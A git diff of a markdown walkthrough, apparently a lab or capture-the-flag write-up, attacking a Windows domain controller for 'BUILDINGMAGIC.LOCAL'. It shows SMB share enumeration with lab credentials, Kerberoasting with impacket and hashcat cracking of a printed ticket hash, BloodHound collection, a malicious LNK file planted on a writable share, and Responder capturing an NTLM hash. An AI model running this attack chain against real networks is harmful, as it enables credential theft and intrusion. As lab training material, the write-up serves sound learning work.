@@ -172,6 +172,7 @@ a.flatch
 
 ## Checking Shares (r.widdleton)
 - I found that a share called File-Share existed on the host but I only had READ Access and couldn't view if anything was in the share.
+
 ```
 netexec smb 10.1.213.153 -u 'r.widdleton' -p 'lilronron' --shares                
 SMB         10.1.213.153    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:False)
@@ -185,7 +186,6 @@ SMB         10.1.213.153    445    DC01             File-Share                  
 SMB         10.1.213.153    445    DC01             IPC$            READ            Remote IPC
 SMB         10.1.213.153    445    DC01             NETLOGON                        Logon server share 
 SMB         10.1.213.153    445    DC01             SYSVOL                          Logon server share 
-
 ```
 
 ```
@@ -199,7 +199,9 @@ smb: \>
 ----
 ## Kerberoasting
 - Using the impacket-GetUserSPNs tool I was able to retrieved a service ticket for the HOGWARDS-DC SPN.
+
 `impacket-GetUserSPNs -dc-ip 10.1.213.153 buildingmagic.local/r.widdleton:lilronron -request`
+
 ```
 impacket-GetUserSPNs -dc-ip 10.1.213.153 buildingmagic.local/r.widdleton:lilronron -request
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -217,7 +219,9 @@ $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de
 
 ## Kerberoasting - Crack the Hash
 Using the following command I was able to crack the hash using module 13100 with the rockyou wodlist
+
 - `hashcat.exe -m 13100 hahahahashes.txt rockyou.txt -O`
+
 ```
 $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de829df8403ef9ea9bd1a41a2028$285a778442acdc33274824822c77e9c28560a9b9307a9c18937628ade2f5a826847e83249af21a4ae7197deec23a729fd34c4811426f5206bb1e5b0fda59a8bf373bed8b796bdfca9e36461a3451a2ce207efb2f75413f9b65b68dd1c02f6091ebabfa71966a9bfb42d56584cb3cff1e26ffed5963e781a1ca4a9307cf6fc30d92076cbb120ce3d79b76065919735ecaad82178b774bfc064214648c518923af8757cb30bc3d9585261c01f9c3915d84c4af0e73e6324c895512897175d6e92718a6946ef6538190f0eb9bff93231d1fa896f40ab64f9862d78d3055f4fffd6eb11a2179919ac842737bf03c34515ae52e1edeba1234e621d32b6ffee7b4abb1be78705e1833b2ef6350e55d09a6cbd34b13722e3f8af868de974b80dd95126dc461dc5e03e6de3dc7dd210259aa6c715bff1ea7763f1beb42e85a11b94f580f3fca25d01431724a559d2f5142233fce6df24d3083493e683a29025ddc2a8178152f5b08dc1fd5b279da72d1ee65424fcb36ec7de3d42943f911bfc4972c10124d6f3c9d8fa9fe50e478281d919b0dd16186ab11ff919b7be0e6d37da0a4a008e0191e1f3fbc3726a2fd6b5ee5b2b0aa29fc0c8079943ba824ee141cf513eb8b05613dcb68ae4fe2ce244d662ac7d6237f9401df271aa37bfc45c35e4cc0351747e0e889abaf1adcf17b321650f44f602a111ae9e07a0505fe54ad37cc0718cd59bf3ca725211c0e402ba89b8c440afbc3c4ba082d318d2a1fa098fc4a9d5a1d9e23d80f082bd05c9c4d4ba1264a1699c7a24c3fe6c8c1b04701ac1eda8b9ff6c4c8a6b002484bb5206a47cdce183d347b4297e7101ad512deae88233b4a6cd1067b6598265921f166a7524a97e5f7727d67ab10f79057a69e2ee53a9ef2515975818d9b49499c7020dd327eda1640dac7e2bdfa8f2ed5ac91ab5344874980433d4574672d79280b894fa61c675809560869d46f524379426c5aca601f7aeec2353a85632a4aef53c4d44198957f37b4a8724313ef482dccdcc1bfa201cd86303f3c35f0fd0ccd5e5c7685a31ef9cfdd532322059841b213b0576e868ea33a2e3b7535256a5770ee2fd004bc381f8d9dac93e01bb228b221557b8eef4f825ce167361fa8fbe30f0c68a7285cc599864639086156f0397eb52345472705456d486dd4b059bc2b5f46dc684845b3f3837f1a165ddd3574731068836af8ade7e2f701ce0eec00c3a69baecc3b19198bc486daa74c179f522654bbdf1ed436aa814903c105ebfb2ef4261e804f1516547162c84053b001fb3b7bb817e41247cf9a05fdafe0a37b9966ceb7ff7a4867e288579c82841097bb83b0c6f9da75342b654c93c51a34280a7a660e10073285ec02c12c74de62f6465d7129430825f6d42e5ea487f4d815d089166498f38108589f2f39698302e71708e4f4b6de5dd676eb7b83a2ae109f412e8bb77d5de93781c6c809c7081d382c9c37e809938a670c0e105466adfe1510ae3bfb919c3eb28f4e4745376c01db27e140cb797a326c94071be00dbad3b52fe06a3dcb50a13b1647:rubeushagrid
 ```
@@ -225,6 +229,7 @@ $krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$d1d6de
 -------
 ## Use Bloodhound
 Bloodhound-ce-python is a tool that allows the collection of the information of a domain to be ingested in bloodhound.
+
 ```
 bloodhound-ce-python -u 'r.haggard' -p 'rubeushagrid' -ns 10.1.213.153 -d buildingmagic.local -c all
 INFO: BloodHound.py for BloodHound Community Edition
@@ -248,10 +253,10 @@ WARNING: Could not resolve GPO link to CN={31B2F340-016D-11D2-945F-00C04FB984F9}
 INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: DC01.BUILDINGMAGIC.LOCAL
 INFO: Done in 00M 07S
-
 ```
 
 After the tool is ran these json files will be uploaded in bloodhound
+
 ```
 20251103223538_computers.json
 20251103223538_containers.json
@@ -260,7 +265,6 @@ After the tool is ran these json files will be uploaded in bloodhound
 20251103223538_groups.json
 20251103223538_ous.json
 20251103223538_users.json
-
 ```
 
 ## Launching Bloodhound
@@ -303,7 +307,6 @@ SMB         10.1.213.153    445    DC01             File-Share      READ,WRITE  
 SMB         10.1.213.153    445    DC01             IPC$            READ            Remote IPC
 SMB         10.1.213.153    445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.1.213.153    445    DC01             SYSVOL          READ            Logon server share 
-                                                                                                                     
 ```
 
 ## LNK Attack
@@ -324,7 +327,6 @@ SMB         10.1.213.153    445    DC01             NETLOGON        READ        
 SMB         10.1.213.153    445    DC01             SYSVOL          READ            Logon server share 
 SLINKY      10.1.213.153    445    DC01             [+] Found writable share: File-Share
 SLINKY      10.1.213.153    445    DC01             [+] Created LNK file on the File-Share share
-                                                                                                      
 ```
 
 Before I ran the prior command I set up responder in an attempt to catch the hash of any user who browses the share 
@@ -346,7 +348,6 @@ H.GRANGON::BUILDINGMAGIC:6238d57d5b51be69:61cf68ca3892f99ce506cc38273b7b63:01010
 ## Bloodhound (H.grangon)
 According to bloodhound and additional confirmation with the netexec tool I confirmed that h.grangon has access to winrm
 <img width="953" height="256" alt="image" src="https://github.com/user-attachments/assets/b13dab61-f10b-440f-a65b-45014ddb396b" />
-
 
 
 
